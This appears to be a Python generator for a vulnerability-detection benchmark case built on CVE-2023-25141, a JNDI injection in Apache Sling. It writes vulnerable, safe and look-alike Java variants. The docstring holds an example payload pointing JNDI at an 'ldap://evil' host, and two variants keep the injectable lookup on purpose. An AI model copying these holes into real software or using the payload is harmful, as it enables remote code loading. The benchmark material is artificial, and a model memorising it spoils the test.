"""
Section 9 ground-truth test bundle: CASE-0112
(apache/sling-org-apache-sling-jcr-base, RepositoryAccessor, CVE-2023-25141,
CWE-74 injection -- JNDI/RMI lookup of caller-controlled names/contexts).

Core vulnerable mechanism: `getRepository(repositoryName, jndiContext)`
does `new InitialContext(jndiContext).lookup(repositoryName)` and, for
names starting with "rmi://", `ClientRepositoryFactory.getRepository(name)`.
Both the name AND the JNDI environment (java.naming.factory.initial,
java.naming.provider.url) are attacker-reachable, e.g. through
`getRepositoryFromURL("jndi://x:java.naming.factory.initial=...,
java.naming.provider.url=ldap://evil")`, so an attacker can make the JVM
contact an arbitrary LDAP/RMI server and load what it returns. The
upstream "fix" deprecates the class and makes getRepository throw
UnsupportedOperationException (feature removed).

Every variant is the FULL real file with getRepository replaced. The method
has two in-file call sites (getRepositoryFromURL), which the renamed
variant also renames; `laf.getRepository(...)` / `crf.getRepository(...)`
belong to other classes and are NOT touched.
"""
import re
from pathlib import Path

CASE_DIR = Path(__file__).resolve().parent.parent.parent / "benchmark" / "cases" / "CASE-0112"
original = (CASE_DIR / "vulnerable_source.java").read_text()
assert "\r" not in original

HDR = "    public Repository getRepository(String repositoryName,\n            Hashtable<String, Object> jndiContext) {\n"
s = original.index(HDR)
e = original.index("\n    }\n", s) + len("\n    }\n")
BLOCK = original[s:e]
CALL1 = "            return getRepository(name, jndiContext);\n"
CALL2 = "        return getRepository(url, null);\n"
assert original.count(HDR) == 1 and original.count(CALL1) == 1 and original.count(CALL2) == 1
assert original.count("getRepository(") == 5


def build(new_block, calls=()):
    assert new_block != BLOCK
    out = original[:s] + new_block + original[e:]
    for old, new in calls:
        assert out.count(old) == 1
        out = out.replace(old, new)
    return out


def rename_outside_comments_strings(text, pairs):
    out = []
    for line in text.split("\n"):
        st = line.lstrip()
        if st.startswith("//") or st.startswith("*") or st.startswith("/*"):
            out.append(line)
            continue
        parts = re.split(r'("(?:[^"\\]|\\.)*")', line)
        for i in range(0, len(parts), 2):
            for old, new in pairs:
                parts[i] = re.sub(r"\b%s\b" % old, new, parts[i])
        out.append("".join(parts))
    return "\n".join(out)


# --- Variant 1: renamed vulnerable variant ---
b = BLOCK.replace("public Repository getRepository(", "public Repository acquireRepository(")
b = rename_outside_comments_strings(b, (("repositoryName", "repoName"), ("jndiContext", "jndiEnv"), ("result", "acquired"),
                                        ("tried", "attempted"), ("initialContext", "ctx"), ("repoObject", "found")))
assert "ctx.lookup(repoName)" in b and "new InitialContext(jndiEnv)" in b and "crf.getRepository(repoName)" in b
assert "laf.getRepository(remoteRepo)" in b
(CASE_DIR / "variant_vulnerable_01.java").write_text(build(b, (
    (CALL1, "            return acquireRepository(name, jndiContext);\n"),
    (CALL2, "        return acquireRepository(url, null);\n"))))

# --- Variant 2: structurally changed vulnerable variant ---
# Positive-condition form of the JNDI guard (branches swapped).
OLD_HEAD = ('        if (jndiContext == null || jndiContext.size() == 0) {\n'
            '            log.info("jndiContext is null or empty, not trying JNDI");\n'
            '        } else {\n')
assert BLOCK.count(OLD_HEAD) == 1
h = BLOCK.index(OLD_HEAD)
tail_marker = "\n        }\n\n        if (result == null) {\n            if (repositoryName == null"
t = BLOCK.index(tail_marker, h)
body = BLOCK[h + len(OLD_HEAD):t]
new_jndi = ('        if (jndiContext != null && !jndiContext.isEmpty()) {\n' + body + '\n        } else {\n'
            '            log.info("jndiContext is null or empty, not trying JNDI");\n        }')
b = BLOCK[:h] + new_jndi + BLOCK[t + len("\n        }"):]
assert "initialContext.lookup(repositoryName)" in b and b != BLOCK
(CASE_DIR / "variant_vulnerable_02.java").write_text(build(b))

# --- Variant 3: transformed safe variant ---
# Remote JNDI/RMI acquisition is disabled: log a FIXED message (never the
# caller-supplied name/context, which could carry CR/LF) and return null,
# as the Javadoc's "or null if not found" allows (upstream throws
# UnsupportedOperationException instead).
b = HDR + '''        log.warn("Acquiring a Repository via JNDI or RMI is no longer supported");
        return null;
    }
'''
safe_source = build(b)
assert "initialContext.lookup" not in safe_source and "crf.getRepository" not in safe_source
assert "InitialContext(" not in safe_source
(CASE_DIR / "variant_safe_01.java").write_text(safe_source)

# --- Variant 4: benign structural look-alike ---
benign_source = '''import javax.jcr.Repository;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LocalRepositoryLocator {

    /** Fixed, developer-defined name in the container's own java:comp/env namespace. */
    private static final String REPOSITORY_JNDI_NAME = "java:comp/env/jcr/repository";

    /**
     * Same InitialContext.lookup(...) acquisition, but nothing the caller
     * passes reaches JNDI: the name is a constant and the environment is the
     * container's default (no caller-supplied factory or provider URL).
     */
    public Repository locate() {
        try {
            Object found = new InitialContext().lookup(REPOSITORY_JNDI_NAME);
            return found instanceof Repository ? (Repository) found : null;
        } catch (NamingException e) {
            return null;
        }
    }
}
'''
assert "new InitialContext()" in benign_source
(CASE_DIR / "benign_lookalike.java").write_text(benign_source)
print("Wrote 4 new samples for CASE-0112.")
